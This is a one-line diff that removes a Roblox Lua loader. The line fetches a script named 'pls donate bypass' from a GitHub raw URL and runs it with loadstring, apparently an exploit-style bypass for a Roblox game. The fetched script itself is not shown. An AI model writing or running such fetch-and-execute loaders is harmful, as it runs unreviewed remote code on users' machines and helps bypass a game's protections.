@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/BoredStuff2/breadhub/main/scripts/pls%20donate%20bypass'))()
